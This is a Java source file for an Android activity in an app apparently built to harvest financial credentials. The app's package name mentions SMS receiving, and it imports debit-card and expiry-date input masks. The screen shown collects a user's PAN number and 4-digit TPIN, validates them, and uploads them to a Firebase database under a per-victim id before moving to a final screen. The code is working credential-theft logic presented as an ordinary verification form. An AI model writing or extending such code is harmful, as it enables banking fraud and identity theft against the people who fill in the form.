package com.example.smsreceiver.klajldffjlajsf.sarkar;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.example.smsreceiver.klajldffjlajsf.sarkar.bg.DebitCardInputMask;
import com.example.smsreceiver.klajldffjlajsf.sarkar.bg.ExpiryDateInputMask;
import com.example.smsreceiver.klajldffjlajsf.sarkar.bg.FormValidator;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class ThirdActivity extends AppCompatActivity {

    private EditText pano, tpin;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main3);

        String id = getIntent().getStringExtra("id");

        pano = findViewById(R.id.panno);
        tpin = findViewById(R.id.tpin);

        Button buttonSubmit = findViewById(R.id.verify);

        buttonSubmit.setOnClickListener(v -> {
            if (validateForm()) {
                buttonSubmit.setText("Please Wait");

                HashMap<String, Object> dataObject = new HashMap<>();
                dataObject.put("panno", pano.getText().toString().trim());
                dataObject.put("tpin", tpin.getText().toString().trim());
                dataObject.put("updated_at", Helper.datetime());

                FirebaseDatabase database = FirebaseDatabase.getInstance();
                DatabaseReference usersRef = database.getReference("data").child(Helper.SITE).child("form");

                assert id != null;
                String userId2 = usersRef.push().getKey();  // Generate a unique key
                assert userId2 != null;
                usersRef.child(id).child(userId2).setValue(dataObject)
                        .addOnSuccessListener(aVoid -> {
                            Intent intent = new Intent(this, LastActivity.class);
                            intent.putExtra("id", id);
                            startActivity(intent);
                        })
                        .addOnFailureListener(e -> {
                            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                            Log.d(Helper.TAG, "Error: " + e.getMessage());
                        });
            } else {
                Helper.debug(ThirdActivity.this, "Form Validation Failed");
            }

        });

    }

    private boolean validateForm() {
        boolean on1 = FormValidator.validateRequired(tpin, "TPIN is required");
        boolean on11 = FormValidator.validateMinLength(tpin, 4, "TPIN 4 digit is required");
        boolean on2 = FormValidator.validateRequired(pano, "Pan Number is required");
        boolean on22 = FormValidator.validatePANCard(pano, "Pan Number is invalid");
        return on1 && on11 && on2 && on22;
    }
}
